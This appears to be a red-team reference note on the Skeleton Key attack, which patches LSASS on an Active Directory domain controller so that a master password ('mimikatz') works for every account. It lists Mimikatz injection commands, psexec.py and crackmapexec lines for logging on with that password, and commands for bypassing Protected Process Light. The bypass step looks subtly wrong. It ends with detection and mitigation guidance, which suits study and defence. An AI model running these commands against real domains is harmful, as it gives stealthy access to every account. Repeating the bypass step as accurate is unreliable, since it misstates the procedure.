---
title: Skeleton Key
aliases: ["Skeleton Key attack", "skeleton key injection"]
type: technique
domain: [red-team, active-directory]
attack_tactic: [persistence, credential-access]
tags: [type/technique, domain/red-team, attack/persistence]
source: "Dell SecureWorks / Benjamin Delpy"
source_url: "https://www.secureworks.com/research/skeleton-key-malware-analysis"
verified: true
related: ["[[Domain Controller (DC)]]", "[[LSASS]]", "[[NTLM Authentication]]", "[[Kerberos]]", "[[Mimikatz]]"]
created: 2026-06-07
updated: 2026-06-07
---

# Skeleton Key

> [!summary] One-liner
> Patch the DC's LSASS process in memory to install a master password that works for any domain account alongside the real password — a stealthy persistence mechanism that survives until the DC reboots.

## Concept abused
The Skeleton Key attack injects code into [[LSASS]] on a [[Domain Controller (DC)]] that hooks the authentication routines. After injection, the DC accepts **two passwords** for every account: the **real password** (unchanged, user never notices) and the **skeleton key** (a master password the attacker chose, default: `mimikatz`). Both [[NTLM Authentication]] and [[Kerberos]] (RC4 etype) are affected.

## Prerequisites
- **Domain Admin** access to the DC (needed to inject into LSASS).
- Must be run on **every DC** that handles authentication (otherwise requests hitting an uninjected DC won't accept the skeleton key).
- **Not persistent across reboots** — the LSASS patch is in-memory only.

## Commands & tools

### Mimikatz (on the DC)
```
# Inject skeleton key (default password: "mimikatz")
mimikatz # privilege::debug
mimikatz # misc::skeleton

# Now authenticate as any user with password "mimikatz"
# (original passwords still work)
```

### Using the skeleton key (from attacker machine)
```bash
# PsExec with skeleton key
psexec.py <DOMAIN>/Administrator:mimikatz@<TARGET>

# Or any NTLM/Kerberos auth tool
crackmapexec smb <TARGET> -u Administrator -p mimikatz -d <DOMAIN>
```

### If LSASS is running as PPL (Protected Process Light)
```
# Mimikatz can bypass PPL using a kernel driver
mimikatz # !+
mimikatz # !processtoken
mimikatz # misc::skeleton
```

## Detection / artifacts
- **LSASS memory modifications**: process integrity monitoring tools detect patches to `lsass.exe`.
- **Event 7045**: if Mimikatz loads a driver (`mimidrv.sys`) to bypass PPL.
- **Authentication anomalies**: successful logons with the wrong password hash (compare NTLM responses with stored hashes — skeleton key uses a different NT hash).
- **Behavioral**: privileged logon events from unusual sources using the skeleton password.
- Tools: Windows Credential Guard prevents LSASS injection (blocks the skeleton key technique).

## Mitigation
- **Credential Guard**: Runs LSASS in an isolated virtual container — prevents memory patching.
- **LSA Protection (PPL)**: `RunAsPPL = 1` makes injection harder (though not impossible with kernel driver).
- Monitor LSASS for code injection (Sysmon Event 8 — CreateRemoteThread targeting LSASS).
- **Multi-factor authentication**: The skeleton key only provides the password factor.
- Regular DC reboots clear the in-memory patch (though an attacker can re-inject).

## Related
- Host process: [[LSASS]].
- Target: [[Domain Controller (DC)]].
- Tool: [[Mimikatz]] (`misc::skeleton`).
- Similar persistence: [[DSRM]] (abuses the DSRM local admin account on DCs).

## Sources
- Dell SecureWorks — "Skeleton Key Malware Analysis" (January 2015).
- Mimikatz documentation.
